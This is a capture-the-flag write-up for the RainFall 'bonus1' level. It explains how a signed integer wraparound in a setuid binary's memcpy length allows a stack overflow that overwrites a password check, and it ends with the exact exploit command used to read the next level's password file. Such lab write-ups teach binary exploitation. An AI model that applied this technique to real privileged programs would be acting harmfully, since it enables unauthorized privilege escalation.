# RainFall (bonus1)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/bonus2/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the `file -b ~/bonus1` command.

We use `objdump -d ~/bonus1` to disassemble the binary. We stored its truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/bonus1`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```

The binary is owned by `bonus2` and has the `setuid` flag set.
```sh
$ ls -la ~/bonus1 
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 /home/user/bonus1/bonus1
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to an "Integer Overflow or Wraparound" ([CWE-190](https://cwe.mitre.org/data/definitions/190.html)) that enables a "Stack-based Buffer Overflow" ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)).

A privilege escalation opportunity is hidden behind 2 conditions that, together, are intended to be impossible to pass.
The aforementioned **password** (`argv[1]`) is passed as a **signed 32-bit integer** and must be `< 10` but also `== 1464814662` (`0x574f4c46`).

The thing is that an unnecessary `memcpy()` call is inserted between the first and the second condition.

`memcpy()`:
- writes a user controlled buffer (`argv[2]`) directly into a fixed 40-byte stack buffer.
- derives its length from **password** as `password * 4`. The `< 10` gate is a **signed** check (any negative value passes), but the length is computed on a **32-bit** integer that **wraps around** and is consumed as an unsigned **size_t**. A negative **password** thus clears the gate yet yields a positive length large enough (`>= 44`) to overflow the buffer and overwrite **password** itself.

## Vulnerability analysis

Analysing the [source](source.c) we assumed the following: **buffer** and **password** are defined contiguously in the stack.  
If this is true, the value of **password** could be arbitrarily set via `memcpy()`. 

### Stack

`main()` is the only function and the one that holds the overflowed buffer.
Its stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
| |      argv     | (4 bytes)    | <-- ['./bonus1', arg1, arg2];
| +---------------+              |
| |      argc     | (4 bytes)    |
+--------------------------------+
|      main's return address     | (4 bytes)
+--------------------------------+ <--- main's Stack Frame start (@ 0xbffffe5c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- main's local variables start (EBP: @ 0xbffffe58)
| |  unused/align | (8 bytes)    |
| +---------------+ (0xbffffe50) |
| |    password   | (4 bytes)    |
| +---------------+ (0xbffffe4c) |
| |               |              |
| |     buffer    | (40 bytes)   |
| |               |              | (64 bytes)
| +---------------+ (0xbffffe24) |
| |  unused/align | (8 bytes)    |
| +---------------+ (0xbffffe1c) |
| |    arg nº3    | (4 bytes)    |
| +---------------+ (0xbffffe18) |
| |    arg nº2    | (4 bytes)    |
| +---------------+ (0xbffffe14) |
| |    arg nº1    | (4 bytes)    |
+--------------------------------+ <--- main's Stack Pointer (ESP: @ 0xbffffe10)
      LOWER MEMORY ADDRESSES      
```

### Intent

As observed: **buffer** and **password** are contiguous in memory. Overflowing **buffer** by 4 bytes would allow us to overwrite **password**.

To achieve this, **password** must satisfy two conditions:
- it must be `< 10` (to pass the first check).
- must wrap-around to target length when multiplied by 4 (cf. [Formula](#formula)).

As well, the intended password value provided to us is:
- In **big-endian hex**: `0x574f4c46`  
- In **big-endian hex** escape sequence: `\x57\x4f\x4c\x46`.  
- In **little-endian hex** escape sequence: `\x46\x4c\x4f\x57`.  
- In **little-endian oct** escape sequence: `\106\114\117\127`.  

## Formula

We want `memcpy()` to copy exactly **44 bytes**: the **40 bytes** of **buffer** + the **4 bytes** of **password** sitting right above it.  
Our only lever is **password** itself, since the copied length is `password * 4`.

Two facts constrain the value of **password**:
- it is a **signed 32-bit** `int`, so `password * 4` **wraps around** `2^32` before being read as an unsigned `size_t`.
- it must stay `< 10` to pass the first condition.

The first approach was naive: `password = memcpy_length / 4`.
Though, when `memcpy_length` is set to 44, it yielded `11`, which was too high.

To get a negative value, the second approach was premeditating the wrap-around caused by the type conflict. As we are on a **32-bit binary**, we can just substract 2^32 bytes to trigger an inverse wrap around artifically: `(memcpy_length - 2^32) / 4`.

For `memcpy_length = 44`, this gives `password = -1073741813`.

## Exploit

```sh
$ arg1='-1073741813'; # (44 - 2^32) / 4:
$ arg2='XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\106\114\117\127';
$ ./bonus1 "$arg1" "$(printf '%b' "$arg2")"
```

From there, we can open the  `/home/user/bonus2/.pass` file.
